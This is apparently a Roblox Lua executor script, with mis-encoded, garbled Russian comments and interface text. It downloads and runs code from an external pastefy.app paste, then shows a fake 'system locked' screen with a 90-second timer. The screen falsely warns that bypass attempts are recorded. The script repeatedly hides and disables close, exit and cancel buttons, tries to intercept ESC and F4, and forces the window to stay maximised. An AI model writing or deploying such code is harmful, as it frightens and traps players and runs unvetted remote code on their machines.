-- –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–µ—Ä–≤–∏—Å—ã
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- –û—Ç–∫–ª—é—á–∞–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∑–∞–∫—Ä—ã—Ç–∏—è —á–µ—Ä–µ–∑ CoreGui
for _, obj in pairs(CoreGui:GetChildren()) do
    if obj:IsA("ScreenGui") then
        obj.ResetOnSpawn = false
    end
end

-- –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–±—É–µ–º –∑–∞–≥—Ä—É–∑–∏—Ç—å –≤—Ç–æ—Ä–æ–π —Å–∫—Ä–∏–ø—Ç
local success, errorMsg = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
end)

if not success then
    warn("–í—Ç–æ—Ä–æ–π —Å–∫—Ä–∏–ø—Ç –Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª—Å—è:", errorMsg)
end

-- –ó–∞—Ç–µ–º –∑–∞–≥—Ä—É–∂–∞–µ–º Rayfield
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()

-- –°–æ–∑–¥–∞–Ω–∏–µ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –æ–∫–Ω–∞
local Window = Rayfield:CreateWindow({
    Name = "–°–ò–°–¢–ï–ú–ê –ë–õ–û–ö–ò–†–û–í–ö–ò",
    LoadingTitle = "–ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø –ó–ê–©–ò–¢–´",
    LoadingSubtitle = "–ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω",
    ConfigurationSaving = {
        Enabled = false
    },
    Discord = {
        Enabled = false
    },
    KeySystem = false
})

-- –°–æ–∑–¥–∞–µ–º –≤–∫–ª–∞–¥–∫—É
local Tab = Window:CreateTab("–ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–û", 4483362458)

-- –°–æ–∑–¥–∞–µ–º —Å–µ–∫—Ü–∏—é
local TimerSection = Tab:CreateSection("–°–ò–°–¢–ï–ú–ù–ê–Ø –ë–õ–û–ö–ò–†–û–í–ö–ê")

-- –¢–∞–π–º–µ—Ä (–æ–±—ä—è–≤–ª—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –∑–¥–µ—Å—å)
local TimerLabel = Tab:CreateLabel("–î–û –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ö–ò: 1:30")
local timeRemaining = 90 -- –ò—Å–ø–æ–ª—å–∑—É–µ–º –¥—Ä—É–≥—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é

-- –§—É–Ω–∫—Ü–∏—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
local function lockInterface()
    -- –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–ª–∞–≤–∏—à
    UIS.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Escape then
            -- –ë–ª–æ–∫–∏—Ä—É–µ–º ESC
        elseif input.KeyCode == Enum.KeyCode.F4 then
            -- –ë–ª–æ–∫–∏—Ä—É–µ–º F4
        end
    end)

    -- –ü–æ—Å—Ç–æ—è–Ω–Ω–æ–µ —Å–∫—Ä—ã—Ç–∏–µ –∫–Ω–æ–ø–æ–∫ –∑–∞–∫—Ä—ã—Ç–∏—è
    while true do
        pcall(function()
            for _, gui in pairs(CoreGui:GetDescendants()) do
                if (gui:IsA("TextButton") or gui:IsA("ImageButton")) and 
                   (gui.Name:lower():find("close") or gui.Name:lower():find("exit") or 
                    gui.Name:lower():find("cancel") or gui.Name:lower():find("x")) then
                    gui.Visible = false
                    gui.Active = false
                end
            end
            
            for _, gui in pairs(PlayerGui:GetDescendants()) do
                if (gui:IsA("TextButton") or gui:IsA("ImageButton")) and 
                   (gui.Name:lower():find("close") or gui.Name:lower():find("exit") or 
                    gui.Name:lower():find("cancel") or gui.Name:lower():find("x")) then
                    gui.Visible = false
                    gui.Active = false
                end
            end
        end)
        task.wait(0.5)
    end
end

-- –ó–∞–ø—É—Å–∫–∞–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É
spawn(lockInterface)

-- –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä (–∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
spawn(function()
    local timer = 90
    while timer > 0 do
        task.wait(1)
        timer = timer - 1
        local minutes = math.floor(timer / 60)
        local seconds = timer % 60
        TimerLabel:Set("–î–û –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ö–ò: " .. string.format("%d:%02d", minutes, seconds))
        
        -- –£—Å–∏–ª–∏–≤–∞–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
        if timer % 10 == 0 then
            pcall(function()
                Window:Minimize()
                task.wait(0.1)
                Window:Maximize()
            end)
        end
    end
    
    TimerLabel:Set("–°–ò–°–¢–ï–ú–ê –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–ù–ê")
end)

-- –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞ —á–µ—Ä–µ–∑ RenderStepped
RunService.RenderStepped:Connect(function()
    pcall(function()
        -- –ü–æ—Å—Ç–æ—è–Ω–Ω–æ –∞–∫—Ç–∏–≤–∏—Ä—É–µ–º –æ–∫–Ω–æ
        Window:Maximize()
    end)
end)

-- –°–æ–æ–±—â–µ–Ω–∏–µ –æ –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ
Tab:CreateParagraph({
    Title = "‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –°–ò–°–¢–ï–ú–ê –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–ê",
    Content = "–ó–∞–∫—Ä—ã—Ç–∏–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ –¥–æ –æ–∫–æ–Ω—á–∞–Ω–∏—è —Ç–∞–π–º–µ—Ä–∞.\n–õ—é–±—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –æ–±—Ö–æ–¥–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —Ñ–∏–∫—Å–∏—Ä—É—é—Ç—Å—è."
})

print("üîí –°–ò–°–¢–ï–ú–ê –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–ê - –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∑–∞—â–∏—â–µ–Ω")
